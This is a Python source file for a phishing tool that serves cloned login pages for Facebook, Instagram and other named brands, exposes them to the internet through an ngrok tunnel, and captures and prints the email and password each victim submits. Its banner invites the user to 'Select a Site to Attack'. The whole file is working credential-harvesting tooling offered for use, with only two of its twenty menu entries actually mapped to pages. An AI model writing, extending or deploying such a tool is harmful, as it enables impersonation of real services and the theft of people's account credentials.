import os
from colorama import Fore
import webbrowser
from pyngrok import ngrok
import subprocess
import sys
from http.server import BaseHTTPRequestHandler, HTTPServer
from http import HTTPStatus
import urllib.parse


options = {
    "01": "htdocs/01.facebook.html",
    "02": "htdocs/02.instagram.html",
    # Add other options here for 03 to 20
}

class FormRequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/":
            # Serve the root page (index.html)
            self.send_response(HTTPStatus.OK)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            with open(os.path.join(".", "htdocs/index.html"), 'rb') as file:
                self.wfile.write(file.read())
        elif self.path.startswith("/htdocs"):
            # Serve the website content for files in the htdocs directory
            try:
                with open(os.path.join(".", self.path[1:]), 'rb') as file:
                    if self.path.endswith(".woff"):
                        self.send_response(HTTPStatus.OK)
                        self.send_header('Content-type', 'font/woff')
                    else:
                        self.send_response(HTTPStatus.OK)
                        self.send_header('Content-type', 'application/octet-stream')
                    self.end_headers()
                    self.wfile.write(file.read())
            except FileNotFoundError:
                self.send_response(HTTPStatus.NOT_FOUND)
                self.end_headers()
        else:
            self.send_response(HTTPStatus.NOT_IMPLEMENTED)
            self.end_headers()
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        form_data = self.rfile.read(content_length).decode('utf-8')
        form_data = urllib.parse.parse_qs(form_data)

        # Extract email and password from the form data
        email = form_data.get('email', [''])[0]
        password = form_data.get('pass', [''])[0]

        print("Email:", email)
        print("Password:", password)

        self.send_response(HTTPStatus.OK)
        self.send_header('Content-type', 'text/html')
        self.end_headers()

        response_content = "<h1>Form Submitted Successfully!</h1>"
        self.wfile.write(response_content.encode('utf-8'))

def clear_screen():
    if os.name == 'nt':  # Windows
        os.system('cls')
    else:  # Unix (Linux/Mac)
        os.system('clear')

def run_http_server(directory, python_executable):
    # Using FormRequestHandler as the handler for the server
    handler_class = FormRequestHandler
    server_address = ("", 8080)

    try:
        httpd = HTTPServer(server_address, handler_class)
        httpd.serve_forever()
    except KeyboardInterrupt:
        httpd.server_close()

def find_python_executable():
    try:
        result = subprocess.run(["which", "python3"] if sys.platform != "win32" else ["where", "python"], capture_output=True, text=True, check=True)
        return result.stdout.strip()
    except subprocess.CalledProcessError:
        return None

def title():
    logo = (
        "         "+Fore.LIGHTCYAN_EX   +"              _     _     _     _             \n"
        "         "+Fore.LIGHTCYAN_EX   +"             | |   (_)   | |   (_)            \n"
        "         "+Fore.LIGHTCYAN_EX   +"        _ __ | |__  _ ___| |__  _ _ __   __ _ \n"
        "         "+Fore.LIGHTCYAN_EX   +"       | '_ \| '_ \| / __| '_ \| | '_ \ / _` |\n"
        "         "+Fore.LIGHTCYAN_EX   +"      _| |_) | | | | \__ \ | | | | | | | (_| |\n"
        "         "+Fore.LIGHTCYAN_EX   +"     (_) .__/|_| |_|_|___/_| |_|_|_| |_|\__, |\n"
        "         "+Fore.LIGHTCYAN_EX   +"       | |                               __/ |\n"
        "         "+Fore.LIGHTCYAN_EX   +"       |_|                "+Fore.LIGHTRED_EX   +"Version : 1.0 "+Fore.LIGHTCYAN_EX   +"|___/ \n"
        "\n"
        "       "+Fore.LIGHTCYAN_EX+"         ["+Fore.LIGHTWHITE_EX+"-"+Fore.LIGHTCYAN_EX+"] Tool Created by .phishing-project\n"
        "       "+Fore.LIGHTRED_EX+"           ["+Fore.LIGHTWHITE_EX+"::"+Fore.LIGHTRED_EX+"] "+Fore.LIGHTWHITE_EX+"Select a Site to Attack "+Fore.LIGHTRED_EX+"["+Fore.LIGHTWHITE_EX+"::"+Fore.LIGHTRED_EX+"]\n"
        "\n"
        "       "+Fore.LIGHTCYAN_EX+"┏▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬┒\n"
        "       "+Fore.LIGHTCYAN_EX+"|                                                    |\n"
        "       "+Fore.LIGHTCYAN_EX+"|   "+Fore.LIGHTRED_EX+"[01] "+Fore.LIGHTWHITE_EX+"Facebook   "+Fore.LIGHTRED_EX+"[10] "+Fore.LIGHTWHITE_EX+"Linkedin   "+Fore.LIGHTRED_EX+"[19] "+Fore.LIGHTWHITE_EX+"Wordpress   "+Fore.LIGHTCYAN_EX+"|\n"
        "       "+Fore.LIGHTCYAN_EX+"|   "+Fore.LIGHTRED_EX+"[02] "+Fore.LIGHTWHITE_EX+"Instagram  "+Fore.LIGHTRED_EX+"[11] "+Fore.LIGHTWHITE_EX+"Twitch     "+Fore.LIGHTRED_EX+"[20] "+Fore.LIGHTWHITE_EX+"Playstation "+Fore.LIGHTCYAN_EX+"|\n"
        "       "+Fore.LIGHTCYAN_EX+"|   "+Fore.LIGHTRED_EX+"[03] "+Fore.LIGHTWHITE_EX+"Google     "+Fore.LIGHTRED_EX+"[12] "+Fore.LIGHTWHITE_EX+"Pinterest                   "+Fore.LIGHTCYAN_EX+"|\n"
        "       "+Fore.LIGHTCYAN_EX+"|   "+Fore.LIGHTRED_EX+"[04] "+Fore.LIGHTWHITE_EX+"Microsoft  "+Fore.LIGHTRED_EX+"[13] "+Fore.LIGHTWHITE_EX+"Ebay       "+Fore.LIGHTRED_EX+"[exit] "+Fore.LIGHTWHITE_EX+"Exit      "+Fore.LIGHTCYAN_EX+"|\n"
        "       "+Fore.LIGHTCYAN_EX+"|   "+Fore.LIGHTRED_EX+"[05] "+Fore.LIGHTWHITE_EX+"Netflix    "+Fore.LIGHTRED_EX+"[14] "+Fore.LIGHTWHITE_EX+"Dropbox    "+Fore.LIGHTRED_EX+"[help] "+Fore.LIGHTWHITE_EX+"Help      "+Fore.LIGHTCYAN_EX+"|\n"
        "       "+Fore.LIGHTCYAN_EX+"|   "+Fore.LIGHTRED_EX+"[06] "+Fore.LIGHTWHITE_EX+"Paypal     "+Fore.LIGHTRED_EX+"[15] "+Fore.LIGHTWHITE_EX+"Spotify                     "+Fore.LIGHTCYAN_EX+"|\n"
        "       "+Fore.LIGHTCYAN_EX+"|   "+Fore.LIGHTRED_EX+"[07] "+Fore.LIGHTWHITE_EX+"Steam      "+Fore.LIGHTRED_EX+"[16] "+Fore.LIGHTWHITE_EX+"Reddit                      "+Fore.LIGHTCYAN_EX+"|\n"
        "       "+Fore.LIGHTCYAN_EX+"|   "+Fore.LIGHTRED_EX+"[08] "+Fore.LIGHTWHITE_EX+"Twitter    "+Fore.LIGHTRED_EX+"[17] "+Fore.LIGHTWHITE_EX+"Adobe                       "+Fore.LIGHTCYAN_EX+"|\n"
        "       "+Fore.LIGHTCYAN_EX+"|   "+Fore.LIGHTRED_EX+"[09] "+Fore.LIGHTWHITE_EX+"Github     "+Fore.LIGHTRED_EX+"[18] "+Fore.LIGHTWHITE_EX+"Snapchat                    "+Fore.LIGHTCYAN_EX+"|\n"
        "       "+Fore.LIGHTCYAN_EX+"|                                                    |\n"
        "       "+Fore.LIGHTCYAN_EX+"┗▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬┚\n"
        "\n"
    )
    print(Fore.LIGHTCYAN_EX + logo)

def show_help():
    url = "https://github.com/phishing-project/.phishing"
    webbrowser.open(url)

def check_ngrok_installed():
    try:
        subprocess.run(["ngrok", "--version"], capture_output=True, check=True)
        return True
    except subprocess.CalledProcessError:
        return False

def create_ngrok_config(auth_token):
    ngrok_config = f"authtoken: {auth_token}\n"
    with open(os.path.expanduser("~/.ngrok2/ngrok.yml"), "w") as f:
        f.write(ngrok_config)

def get_user_token():
    while True:
        token = input("Please enter your ngrok authentication token: ").strip()
        if token:
            return token
        else:
            print("Token cannot be empty. Please try again.")


def main():
    title()

    if not check_ngrok_installed():
        print("Ngrok is not installed on your computer. Please install ngrok and try again.")
        return

    python_executable = find_python_executable()
    if not python_executable:
        print("Python executable not found. Please make sure Python 3 is installed and accessible from the terminal.")
        return

    # Authenticate with ngrok
    while True:
        try:
            ngrok.set_auth_token(get_user_token())
            break
        except ngrok.PyngrokNgrokHTTPError:
            print("Invalid ngrok authentication token. Please try again.")

    # Set ngrok configuration using environment variables
    os.environ["NGROK_CONFIG_DIR"] = os.path.expanduser("~/.ngrok2")

    while True:
        user_input = input("~/.phishing $ ").strip().lower()

        if user_input == "help":
            show_help()
        elif user_input == "exit":
            print("Exiting .Phishing.")
            break
        elif user_input == "clear":
            clear_screen()
            title()
        elif user_input in options:
            filename = options[user_input]
            # Using pyngrok to serve the selected file as localhost
            public_url = ngrok.connect(addr="8080", proto="http", bind_tls=True)

            try:
                # Get the public URL from the NgrokTunnel object
                ngrok_url = public_url.public_url
                local_url = f"http://localhost:80/{filename}"

                print(f"Local URL: {local_url}")
                print(f"Ngrok URL: {ngrok_url}")

                # Open the ngrok URL in the default web browser
                webbrowser.open(ngrok_url)

                # Launch a local server to serve the selected file using Python's built-in HTTP server
                run_http_server(os.path.dirname(filename), python_executable)
            except AttributeError:
                print("Failed to start tunnel. Please try again.")
            finally:
                # Terminate the ngrok tunnel when done
                ngrok.disconnect(public_url)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nExiting .Phishing.")
    finally:
        ngrok.kill()